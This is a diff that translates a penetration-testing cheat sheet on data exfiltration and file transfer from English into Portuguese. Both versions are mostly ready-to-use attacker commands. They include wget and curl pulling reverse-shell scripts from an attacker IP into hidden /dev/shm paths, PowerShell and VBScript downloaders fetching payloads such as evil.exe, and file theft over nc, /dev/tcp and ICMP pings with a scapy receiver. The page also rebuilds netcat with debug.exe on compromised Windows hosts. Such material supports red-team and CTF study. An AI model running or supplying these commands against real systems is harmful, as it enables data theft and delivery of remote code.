@@ -1,12 +1,12 @@
-# Exfiltration
+# Exfiltração
 
-## Copy&Paste Base64
+## Copiar e Colar Base64
 
 #### Linux
 
 ```bash
-base64 -w0 <file> #Encode file
-base64 -d file #Decode file
+base64 -w0 <arquivo> # Codifica o arquivo
+base64 -d arquivo # Decodifica o arquivo
 ```
 
 #### Windows
@@ -24,14 +24,14 @@ certutil -decode payload.b64 payload.dll
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
-fetch 10.10.14.14:8000/shell.py #FreeBSD
+fetch 10.10.14.14:8000/shell.py # FreeBSD
 ```
 
 #### Windows
 
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
-bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
+bitsadmin /transfer transfName /priority high http://exemplo.com/arquivoexemplo.pdf C:\downloads\arquivoexemplo.pdf
 
 #PS
 (New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
@@ -40,24 +40,24 @@ wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill
 
 Import-Module BitsTransfer
 Start-BitsTransfer -Source $url -Destination $output
-#OR
+#OU
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
 
-### Upload files
+### Upload de arquivos
 
 \*\*\*\*[**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)\*\*\*\*
 
-### **HTTPS Server**
+### **Servidor HTTPS**
 
 ```python
-# from https://gist.github.com/dergachev/7028596
-# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
-# generate server.xml with the following command:
+# de https://gist.github.com/dergachev/7028596
+# tirado de http://www.piware.de/2011/01/creating-an-https-server-in-python/
+# gere o server.xml com o seguinte comando:
 #    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
-# run as follows:
+# execute do seguinte modo:
 #    python simple-https-server.py
-# then in your browser, visit:
+# e então no seu navegador, visite:
 #    https://localhost:443
 
 import BaseHTTPServer, SimpleHTTPServer
@@ -70,28 +70,28 @@ httpd.serve_forever()
 
 ## FTP
 
-### FTP server \(python\)
+### Servidor FTP \(python\)
 
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
 
-### FTP server \(NodeJS\)
+### Servidor FTP \(NodeJS\)
 
 ```text
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
 
-### FTP server \(pure-ftp\)
+### Servidor FTP \(pure-ftp\)
 
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
 
 ```bash
-#Run the following script to configure the FTP server
+# Rode o seguinte script para configurar o servidor FTP
 #!/bin/bash
 groupadd ftpgroup
 useradd -g ftpgroup -d /dev/null -s /etc ftpuser
@@ -104,10 +104,10 @@ chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
 
-### **Windows** client
+### Cliente **Windows**
 
 ```bash
-#Work well with python. With pure-ftp use fusr:ftp
+# Funciona bem com python. Com o pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
 echo USER anonymous >> ftp.txt
 echo anonymous >> ftp.txt
@@ -119,92 +119,92 @@ ftp -n -v -s:ftp.txt
 
 ## SMB
 
-Kali as server
+Kali como servidor
 
 ```bash
-kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
-kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
-#For new Win10 versions
+kali_op1> impacket-smbserver -smb2support kali `pwd` # Compartilha o diretório atual
+kali_op2> smbserver.py -smb2support name /path/folder # Compartilha um diretório
+# Para novas versões do Windows 10
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
 
-Or create a **smb** share **using samba**:
+Ou crie um compartilhamento **smb usando samba**:
 
 ```bash
 apt-get install samba
 mkdir /tmp/smb
 chmod 777 /tmp/smb
-#Add to the end of /etc/samba/smb.conf this:
+# Adicione isto no final de /etc/samba/smb.conf:
 [public]
     comment = Samba on Ubuntu
     path = /tmp/smb
     read only = no
     browsable = yes
     guest ok = Yes
-#Start samba
+# Inicie o samba
 service smbd restart
 ```
 
 Windows
 
 ```bash
-CMD-Wind> \\10.10.14.14\path\to\exe
-CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
+CMD-Wind> \\10.10.14.14\caminho\para\o\executavel
+CMD-Wind> net use z: \\10.10.14.14\test /user:test test # Para o SMB usando credenciais
 
-WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
+WindPS-1> New-PSDrive -Name "novo_disco" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
 
 ## SCP
 
-The attacker has to have SSHd running.
+O atacante tem que ter o SSHd rodando.
 
 ```bash
-scp <username>@<Attacker_IP>:<directory>/<filename> 
+scp <nome_do_usuario>@<ip_do_atacante>:<diretório>/<nome_do_arquivo> 
 ```
 
 ## NC
 
 ```bash
-nc -lvnp 4444 > new_file
-nc -vn <IP> 4444 < exfil_file
+nc -lvnp 4444 > novo_arquivo
+nc -vn <IP> 4444 < arquivo_de_exfiltração
 ```
 
 ## /dev/tcp
 
-### Download file from victim
+### Download de arquivo da vítima
 
 ```bash
-nc -lvnp 80 > file #Inside attacker
-cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
+nc -lvnp 80 > file # máquina atacante
+cat /path/file > /dev/tcp/10.10.10.10/80 # máquina vítima
 ```
 
-### Upload file to victim
+### Upload de arquivo para a vítima
 
 ```bash
-nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
-# Inside victim
+nc -w5 -lvnp 80 < file_to_send.txt # máquina atacante
+# máquina vítima
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
 
-thanks to **@BinaryShadow\_**
+obrigado ao **@BinaryShadow\_**
 
 ## **ICMP**
 
 ```bash
-#In order to exfiltrate the content of a file via pings you can do:
-xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
-#This will 4bytes per ping packet (you could probablie increase this until 16)
+# Para exfiltrar o conteúdo de um arquivo via pings você pode fazer:
+xxd -p -c 4 /caminho/para/o/arquivo | while read line; do ping -c 1 -p $line <IP atacante>; done
+# Isso irá extrair 4 bytes por cada pacote de ping (você provavelmente pode aumentar até 16)
 ```
 
 ```python
 from scapy.all import *
-#This is ippsec receiver created in the HTB machine Mischief
+# Este é o receptor do ippsec criado na máquina Mischief do HTB
 def process_packet(pkt):
     if pkt.haslayer(ICMP):
         if pkt[ICMP].type == 0:
-            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
+            data = pkt[ICMP].load[-4:] # Lê os 4 bytes interessantes
             print(f"{data.decode('utf-8')}", flush=True, end="")
 
 sniff(iface="tun0", prn=process_packet)
@@ -212,7 +212,7 @@ sniff(iface="tun0", prn=process_packet)
 
 ## **SMTP**
 
-If you can send data to an SMTP server, you can create a SMTP to receive the data with python:
+Se você pode enviar dados para um servidor SMTP, você pode criar um SMTP para receber dados com python:
 
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
@@ -220,45 +220,45 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 ## TFTP
 
-By default in XP and 2003 \(in others it need to be explicitly added during installation\)
+Por padrão nos Windows XP e 2003 \(em outros ele precisa ser adicionado explicitamente durante a instalação\)
 
-In Kali, **start TFTP server**:
+No Kali, **inicie o servidor TFTP**:
 
 ```bash
-#I didn't get this options working and I prefer the python option
+# Eu não consegui fazer essa opção funcionar e eu prefiro a opção em python
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
 
-**TFTP server in python:**
+**Servidor TFTP em python:**
 
 ```bash
 pip install ptftpd
-ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
+ptftpd -p 69 tap0 . # ptftp -p <PORTA> <INTERFACE DE REDE> <DIRETÓRIO>
 ```
 
-In **victim**, connect to the Kali server:
+Na **vítima**, conecte ao servidor Kali:
 
 ```bash
-tftp -i <KALI-IP> get nc.exe
+tftp -i <IP-DO-KALI> get nc.exe
 ```
 
 ## PHP
 
-Download a file with a PHP oneliner:
+Download de um arquivo com uma linha de PHP:
 
 ```bash
-echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
+echo "<?php file_put_contents('nomeDoArquivo', fopen('http://192.168.1.102/arquivo', 'r')); ?>" > down2.php
 ```
 
 ## VBScript
 
 ```bash
-Attacker> python -m SimpleHTTPServer 80
+Atacante> python -m SimpleHTTPServer 80
 ```
 
-#### Victim
+#### Vítima
 
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
@@ -294,23 +294,22 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 
 ## Debug.exe
 
-This is a crazy technique that works on Windows 32 bit machines. Basically the idea is to use the `debug.exe` program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like `netcat`. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with `debug.exe`.
+Esta é uma técnica maluca que funciona em máquinas Windows de 32 bits. Basicamente, a ideia é usar o programa `debug.exe`. Ele é usado para inspecionar binários, como um debugger. Mas ele também pode reconstruí-los a partir de hexadecimal. Então a ideia é pegarmos um binário como o `netcat`. Em seguida, desmontá-lo em hexadecimal, colar ele em um arquivo na máquina comprometida, e então remontá-lo com o `debug.exe`.
 
-`Debug.exe` can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that:
+O `Debug.exe` só pode montar 64 kb. Portanto, precisamos usar arquivos menores que isso. Podemos usar o upx para compactá-lo ainda mais. Então vamos fazer isso:
 
 ```text
 upx -9 nc.exe
 ```
 
-Now it only weights 29 kb. Perfect. So now let's disassemble it:
+Agora ele pesa apenas 29 kb. Perfeito. Agora vamos desmontá-lo:
 
 ```text
 wine exe2bat.exe nc.exe nc.txt
 ```
 
-Now we just copy-paste the text into our windows-shell. And it will automatically create a file called nc.exe
+Agora, basta copiar e colar o texto na nossa shell do windows. E ele irá criar automaticamente um arquivo chamado nc.exe
 
 ## DNS
 
 [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
-
